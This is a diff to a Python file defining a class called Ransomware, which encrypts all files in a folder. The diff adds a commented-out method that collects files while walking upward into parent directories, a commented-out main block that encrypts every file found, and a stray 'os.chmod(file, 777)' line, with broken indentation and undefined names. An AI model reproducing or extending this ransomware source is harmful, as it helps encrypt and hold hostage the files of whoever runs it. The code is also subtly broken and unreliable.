@@ -121,7 +121,65 @@ class Ransomware:
                 logging.debug(f"Skipping non-file: {file_path}")
 
         return files
+    
+    """
+    def traverse_directories_outward(self, path, max_depth=None):
 
+    Recursively traverses directories starting from the given path and moving up to parent directories.
+
+    :param str path: The starting directory path.
+    :param int max_depth: Maximum number of parent directories to traverse. None for no limit.
+    :return: A list of file paths.
+
+    files = []
+    current_depth = 0
+
+        def traverse(path, depth):
+            nonlocal current_depth
+            if max_depth is not None and depth > max_depth:
+                return
+
+            try:
+                # Process files in the current directory
+                with os.scandir(path) as entries:
+                    for entry in entries:
+                        full_path = entry.path
+                        if entry.is_file(follow_symlinks=False):
+                            files.append(full_path)
+                        elif entry.is_dir(follow_symlinks=False):
+                            # Avoid recursion into symbolic links and special directories
+                            if entry.name not in ('.', '..', '.git', '__pycache__'):
+                                traverse(full_path, depth + 1)
+            except PermissionError as e:
+                logging.warning(f"Permission denied: {path} - {e}")
+            except FileNotFoundError as e:
+                logging.error(f"Directory not found: {path} - {e}")
+            except Exception as e:
+                logging.error(f"Error accessing {path}: {e}")
+
+        # Start traversal from the initial path
+        traverse(path, current_depth)
+
+        # Traverse parent directories up to the root or until max_depth is reached
+        parent_path = os.path.abspath(os.path.join(path, os.pardir))
+        while True:
+            if max_depth is not None and current_depth >= max_depth:
+                break
+            if parent_path == path or parent_path == os.path.sep:
+                break
+            current_depth += 1
+            traverse(parent_path, current_depth)
+            path = parent_path
+            parent_path = os.path.abspath(os.path.join(path, os.pardir))
+
+    return files
+
+
+    """
+
+    # Ensure that the injected file is executable.
+    os.chmod(file, 777)
+    
     def encrypt_files_in_folder(self, path):
         """
         Encrypts all files in the given directory specified by path.
@@ -172,3 +230,19 @@ if __name__ == '__main__':
     print(f'Number of encrypted files: {number_encrypted_files}')
 
     ransomware.decrypt_files_in_folder(path)
+
+
+"""
+if __name__ == '__main__':
+    logging.basicConfig(level=logging.WARNING)
+
+    script_directory = os.path.dirname(os.path.abspath(__file__))
+    max_traversal_depth = 2  # Keep the depth limited for safety
+
+    all_files = ransomeware.traverse_directories_outward(script_directory, max_depth=max_traversal_depth)
+
+    # Proceed with caution when modifying files
+    encrypt_files(all_files)
+"""
+
+# © 2023 Batyr Mammetesenov. All rights reserved.
